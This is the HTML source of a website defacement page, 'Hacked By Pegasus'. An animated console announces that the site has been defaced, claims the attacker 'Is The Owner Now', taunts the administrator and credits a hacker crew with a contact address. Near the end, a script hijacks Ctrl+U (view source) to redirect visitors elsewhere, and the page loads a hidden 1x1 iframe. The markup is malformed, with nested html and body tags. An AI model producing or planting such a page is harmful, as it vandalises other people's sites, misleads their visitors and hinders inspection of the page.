<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Hacked By Pegasus</title> 
<link rel="shortcut icon" href=" :) "/> 
</head> 

<body><html><head></head><body>html> 

<title>Pegasus@root</title> 
<meta name="robots" content="index, follow"> 
<meta name="description" content="Hacked Web Site" /> 
<meta name="keywords" content="Pegasus,Pegasus"> 
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js" type="text/javascript"></script>  
<style> 
  body{ 
    text-align: center; 
    font-size: 12px; 
    font-family: verdana; 
      background-color: black; 
        background: url('index.html') repeat center center fixed black; 
  } 
  h1 { 
    padding: 10px 15px; 
    margin: 0px; 
    font-size: 14px; 
    background-color: #000000; 
    //background-image: -moz-linear-gradient(100% 100% 90deg, #777, #999) !important; 
      //background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#999), to(#777)) !important; 
    color: #FFF; 
    //-webkit-border-radius:8px 8px 0px 0px; 
    //-moz-border-radius: 8px 8px 0px 0px; 
    border-radius: 8px 8px 0px 0px; 
    text-shadow:1px 1px 2px #333333; 
        opacity: 0.5; 
  } 
  table { 
    width: 565px; 
  } 
  table tr td{ 
    font-family: verdana; 
    font-size: 11px; 
    padding: 10px 5px; 
    border-bottom: solid 1px #CCC; 
     
  } 
  #wrapper{ 
    width: 800px; 
    margin: 10px auto; 
    text-align: left; 
        background: url('index.html') no-repeat center center fixed; 
  } 
  #console{ 
    height: 450px; 
    overflow: auto; 
    background-color: #000; 
    padding: 15px; 
    font-family: monospace; 
    font-size: 12px; 
    color: #FFF; 
  } 
  .content{ 
    padding: 15px; 
  } 
  #commander{ 
    border: solid 1px #CCC; 
    padding: 5px 10px; 
    -webkit-border-radius: 2px; 
    -moz-border-radius: 2px; 
    border-radius: 2px; 
    margin: 5px; 
    width: 590px; 
    height: 30px; 
  } 
  .box{ 
    -moz-box-shadow: 1px 1px 8px #666; 
    -webkit-box-shadow: 1px 1px 8px #666; 
    box-shadow: 1px 1px 8px #40D5D2; 
    border: solid 1px black; 
    -webkit-border-radius: 8px 8px 0px 0px; 
    -moz-border-radius: 8px 8px 0px 0px; 
    border-radius: 8px 8px 0px 0px; 
    margin: 15px 0px; 
    background-color: #F5F5F5; 
        opacity: 0.8; 
  } 
  #help{ 
    width: 300px; 
    float: right; 
  } 
  .prefix{ 
    color: #0077E7; 
  } 
  .keyword{ 
    color: #9eff63; 
  } 
  .error{ 
    color: #FF0000; 
  } 
  .spacer{ 
    clear: both; 
    display: block; 
  } 
</style> 
<script type="text/javascript"> 
//BH?SS?AN 
TypingText = function(element, interval, cursor, finishedCallback) { 
  if((typeof document.getElementById == "undefined") || (typeof  

element.innerHTML == "undefined")) { 
    this.running = true; 
    return; 
  } 
  this.element = element; 
  this.finishedCallback = (finishedCallback ? finishedCallback : function() {  

return; }); 
  this.interval = (typeof interval == "undefined" ? 100 : interval); 
  this.origText = this.element.innerHTML; 
  this.unparsedOrigText = this.origText; 
  this.cursor = (cursor ? cursor : ""); 
  this.currentText = ""; 
  this.currentChar = 0; 
  this.element.typingText = this; 
  if(this.element.id == "") this.element.id = "typingtext" +  

TypingText.currentIndex++; 
  TypingText.all.push(this); 
  this.running = false; 
  this.inTag = false; 
  this.tagBuffer = ""; 
  this.inHTMLEntity = false; 
  this.HTMLEntityBuffer = ""; 
} 
TypingText.all = new Array(); 
TypingText.currentIndex = 0; 
TypingText.runAll = function() { 
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run(); 
} 
TypingText.prototype.run = function() { 
  if(this.running) return; 
  if(typeof this.origText == "undefined") { 
    setTimeout("document.getElementById('" + this.element.id +  

"').typingText.run()", this.interval); 
    return; 
  } 
  if(this.currentText == "") this.element.innerHTML = ""; 
  if(this.currentChar < this.origText.length) { 
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) { 
      this.tagBuffer = "<"; 
      this.inTag = true; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) { 
      this.tagBuffer += ">"; 
      this.inTag = false; 
      this.currentText += this.tagBuffer; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.inTag) { 
      this.tagBuffer += this.origText.charAt(this.currentChar); 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == "&" && ! 

this.inHTMLEntity) { 
      this.HTMLEntityBuffer = "&"; 
      this.inHTMLEntity = true; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == ";" &&  

this.inHTMLEntity) { 
      this.HTMLEntityBuffer += ";"; 
      this.inHTMLEntity = false; 
      this.currentText += this.HTMLEntityBuffer; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.inHTMLEntity) { 
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar); 
      this.currentChar++; 
      this.run(); 
      return; 
    } else { 
      this.currentText += this.origText.charAt(this.currentChar); 
    } 
    this.element.innerHTML = this.currentText; 
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ?  

(typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) :  

""); 
    this.currentChar++; 
    setTimeout("document.getElementById('" + this.element.id +  

"').typingText.run()", this.interval); 
  } else { 
    this.currentText = ""; 
    this.currentChar = 0; 
        this.running = false; 
        this.finishedCallback(); 
  } 
} 
</script> 

   

<div id="wrapper">
 
  <div class="box">
 
    <h1>
Pegasus@root</h1>
<div id="console">
 
<p id="message">
<font color="#009900"> Please Wait . . . </font> <br> 

<font color="#009900"> Trying connect to Server . . .</font><br> 
<font color="#F00000"><font color="#FFF000">Pegasus</font> Connected ! </font><br> 
<font color="#F00000"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Pegasus enter . . . </font><br> 
<font color="#00FFFF""><font color="#FFF000">Pegasus<font color="#FFF000"></font></font> This site Have been Defaced . . !</font><br> 
<font color="#009900"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Hello Admin, Your Security is Low . . .</font><br> 
<font color="#F00000"><font color="#FFF000">Pegasus</font> Is The Owner Now . . .</font><br> 
<font color="#009900"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Please contact me . . . </font><br>
<font color="#FF00FF"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Sorry My Bro . . .</font><br> 
<font color="#009900"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> I will watching you . . . </font><br> 
<font color="#F5A9E1"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> It's Not a game dude . . .</font><br> 
<font color="#F5A9E1"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> It's my Job . . . </font><br> 
<font color="#F5A9E1"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> I am from . . .</font><br> 
<font color="#00FFFF"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Cyber Security Down . . .</font><br> 
<font color="#00FFFF"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Xcyber, Alfa, PoetralesanA, Scode_404, Amarell . . .</font><br> 
<font color="#FF00FF"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> We Are White Hat Hackers . . .</font><br> 
<font color="#009900"><font color="#FFF000">Pegasus<font color="#F00000"></font></font> Reason: changes your cms !</font><br> 

<br> 
<font color="green">[+] Pegasus<br> 
<font color="green">[+] contact me : Pegasus0hacker@gmail.com <br> 
<br> 
<br> 
<font color="red">  >> Hacked By Pegasus <<  </font><br>
<font color="red">  >> Cyber Security Down <<  </font><br>
<script type="text/javascript"> 
new TypingText(document.getElementById("message"), 50, function(i){ var ar  

= new Array("|", "|", "|", "|"); return " " + ar[i.length % ar.length]; }); 

//Type out examples: 
TypingText.runAll(); 

</script></font></font></font></font></font></font></font></font></font> |</span></p>
</div>
<font color="gray"><font color="white"><font color="white"><font color="white"><font color="green"><font color="green"> 
  <div class="spacer">
</div>
<iframe width="1" height="1" src="index.html" frameborder="0" allowfullscreen></iframe> 
<center>
<img src="https://i.imgsafe.org/65999e9679.gif"> 
  </center>
</font></font></font></font></font></font></div>
</div>
<script type='text/javascript'>
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://www.facebook.com/ransomware.detected"});
//]]> </script>
</body></html> 

</body> 
</html>